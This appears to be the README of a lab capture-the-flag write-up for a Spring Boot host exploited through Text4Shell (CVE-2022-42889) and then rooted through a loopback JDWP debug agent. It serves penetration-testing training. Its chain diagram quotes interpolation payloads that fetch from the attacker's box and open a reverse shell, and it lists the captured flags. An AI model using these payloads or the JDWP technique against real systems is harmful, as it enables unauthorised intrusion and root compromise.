# 192.168.237.150 — `text4shell` (Ubuntu 22.04.1)

| | |
|---|---|
| **Hostname** | `lab-pwk2-student-cl5-150-ubuntu20-berlin-241-187` |
| **OS** | Ubuntu 22.04.1 LTS, kernel `5.15.0-52-generic` |
| **Open ports** | `22/tcp` OpenSSH 8.9p1 · `5000/tcp` plain-TCP JVM stats · `8080/tcp` Spring Boot |
| **Loopback only** | `127.0.0.1:8000` — JDWP debug agent, running **as root** |
| **Difficulty** | Medium — nothing to exploit in the normal sense; two misconfigurations chained |
| **Result** | root, `local.txt` and `proof.txt` |
| **Flags** | `6851d85c0e1e82991b98fa6e146532fd` (user) · `43d31153587be5031d1db3f9a934eb46` (root) |

---

## Where commands run

Two hosts are involved. Every command block in every chapter is preceded by one of two markers:

| Marker | Host | Prompt you should see |
|---|---|---|
| **On Kali** | attacker box, `192.168.45.158` (VPN `tun0`) | `kali@kali ~$` |
| **On the target** | a shell on the box as `dev` (obtained in [chapter 04](04-foothold.md)) | `dev@lab-pwk2-student-cl5-150-ubuntu20-berlin-241-187:/$` |

Anything that touches `127.0.0.1` or `/opt` **must** run on the target; anything that listens for a
callback or compiles a tool for delivery runs on Kali. Each chapter opens with a table saying which
steps run where, so the split is never ambiguous.

---

## TL;DR — the chain

```
22/tcp   ssh    — no credentials, never used
5000/tcp        — plain TCP, prints JVM memory stats, unauthenticated (info leak only)
8080/tcp        — Spring Boot "search API"
  └─ GET /search?query=*
     └─ the parameter is handed to Apache Commons Text StringSubstitutor
        (fat jar: BOOT-INF/lib/commons-text-1.8.jar)
           ├─ ${url:UTF-8:http://KALI:8899/x}      → server-side fetch  (proves interpolation)
           ├─ ${script:javascript:...Thread.sleep} → timing oracle     (proves code execution)
           └─ ${script:javascript:new ProcessBuilder(...)}             → reverse shell
                ▼
     shell as dev (uid 1001)  →  /home/dev/local.txt
                │
                ▼
     /opt/stats/App.java runs as root with a JDWP agent on 127.0.0.1:8000
        "java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y"
           └─ JDI attach → breakpoint on String.getBytes → poke port 5000
              → Runtime.exec() on the breakpoint-suspended main thread
                ▼
     root (uid 0)  →  /root/proof.txt
```

Two unrelated mistakes compound here:

1. **The application interpolates untrusted input.** `commons-text-1.8` is inside the vulnerable
   range for CVE-2022-42889, and the default interpolator carries the `url`, `dns` and `script`
   lookups. The endpoint is *blind* — it echoes the raw parameter and always returns an empty
   `result` — so the bug is invisible to anyone who only reads response bodies.
2. **A root process exposes a debug agent.** `-Xdebug -Xrunjdwp:...` on `127.0.0.1:8000` with no
   authentication turns any local shell into root. It is loopback-bound, so it is not remotely
   reachable — but the first bug already provides a local shell.

---

## Chapters

| # | Chapter | What it covers |
|---|---|---|
| 01 | [Reconnaissance](01-reconnaissance.md) | ping, full TCP scan, `-sV -sC`, identifying the three services |
| 02 | [Web enumeration](02-web-enumeration.md) | endpoint sweep, parameter discovery, why the injection is blind |
| 03 | [Text4Shell detection](03-text4shell.md) | CVE-2022-42889, SSRF oracle, timing oracle, the library that proves it |
| 04 | [Foothold](04-foothold.md) | reverse shell via `ProcessBuilder`, shell as `dev`, user flag |
| 05 | [Host enumeration](05-enumeration.md) | processes, listeners, `/opt`, the CHANGELOG, the root JDWP service |
| 06 | [Privilege escalation](06-privilege-escalation.md) | JDWP internals, four failed approaches, the breakpoint technique, root |
| 07 | [Flags and cleanup](07-flags-and-cleanup.md) | both proofs, artefact removal, lessons |

---

## Timeline

| Time | Action | Result |
|---|---|---|
| 20:03 | `curl /` and `/search` | `{"api-status":"up"}`, `{"query":"*","result":""}` |
| 20:04 | `nmap -p-` | 22, 5000, 8080 |
| 20:04 | `${url:...}` payload | callback from `192.168.237.150` with `User-Agent: Java/11.0.16` |
| 20:06 | `${script:...sleep}` | 4175 ms vs 142 ms — code execution confirmed |
| 20:10 | `ProcessBuilder` reverse shell | shell as `dev` (uid 1001) |
| 20:11 | `cat /home/dev/local.txt` | user flag |
| 20:11 | `ps`, `ss`, `/opt` | root JDWP on `127.0.0.1:8000`, readable `App.java` |
| 20:22 | JDI attempts | `INVALID_THREAD` — VM-suspended threads cannot be invoked through |
| 20:29 | breakpoint + poke 5000 | `uid=0(root)`, `/root/proof.txt` |
| 20:37 | cleanup | listeners killed, scratch files removed |

Roughly 30 minutes, of which 20 were spent learning enough about JDWP to make the invocation legal.

---

## Artefacts in this directory

| Path | Contents |
|---|---|
| `evidence/recon.txt` | raw nmap output |
| `evidence/web.txt` | endpoint and parameter sweep |
| `evidence/oob_callback.txt` | listener log proving the server-side fetch |
| `evidence/timing.txt` | timing oracle measurements |
| `evidence/enumeration.txt` | post-foothold host enumeration, raw |
| `evidence/jdwp_root.txt` | root execution transcript |
| `README.md` | this file — chain, timeline, host/where convention |
| `tools/JdiBreakExec.java` | JDWP → root PoC used in chapter 06 |
| `tools/JdiVmSuspend.java` | minimal JDI attach + invoke, reproduces the `IncompatibleThreadStateException` |
| `tools/t4s_probe.py` | Text4Shell payload sender used throughout |
| `tools/cap_server.py` | raw HTTP capture server used for the out-of-band proof |
